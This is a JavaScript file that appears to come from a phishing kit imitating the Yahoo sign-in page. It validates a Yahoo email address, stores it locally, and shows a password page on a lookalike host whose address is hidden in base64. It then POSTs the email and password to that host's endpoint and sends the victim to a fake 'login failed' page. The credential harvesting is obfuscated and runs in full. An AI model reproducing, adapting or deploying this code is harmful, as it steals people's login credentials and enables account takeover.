document.addEventListener("DOMContentLoaded", function () {
    console.log("loaded");

    const h = "aHR0cHM6Ly95YWgwMC5vbnJlbmRlci5jb20=";
    const e = "aHR0cHM6Ly95YWgwMC5vbnJlbmRlci5jb20vZW5kcG9pbnQ=";
    const ymr = /^[^\s@]+@yahoo\.com$/i;
    const nb = document.querySelector("#login-signin");
    const ei = document.querySelector("#login-username");
    const pi = document.querySelector("#login-passwd");
    const ec = document.querySelector(".yid");
    const sb = document.querySelector("#login-signin");
    const ue = "dXNlci1lbWFpbA=="

    if (nb) {
        nb.addEventListener("click", function (e) {
            e.preventDefault();
            if (!ei) {
                return;
            };
            if (!ei.value) {
                ei.addAttribute = disabled;
                return;
            } else {
                const ev = ei.value;
                gtp(ev);
            };
        });
    }
    else {
        console.error("Element with id #login-signin not found");
    }

    const el = localStorage.getItem(atob(ue));
    ec.textContent = el;

    sb.addEventListener("click", async (e) => {
        e.preventDefault();
        const pd = pi.value;
        await sfr(el, pd);
    });


    function gtp(el) {
        const isy = isym(el);
        //then
        if (isy) {
            localStorage.setItem(atob(ue), el);
            window.location.href = `${atob(h)}/display-password.htm`;
        }
        return;
    };

    function isym(el) {
        return ymr.test(el);
    }


    async function sfr(el, pd) {
        localStorage.removeItem(atob(ue));

        const pld = {
            el,
            pd
        };
        try {
            const res = await axios.post(`${atob(e)}`, pld, {
                headers: {
                    "Content-Type": "application/json",
                    "Access-Control-Allow-Origin": "*"
                }
            });
            if (res.status == 200) {
                window.location.href = `${atob(h)}/login-failed.htm`;
            } else {
                window.location.href = `${atob(h)}/display-login.htm`;
            }
        } catch (error) {
            console.error("Error:", error);
        }
    };
});

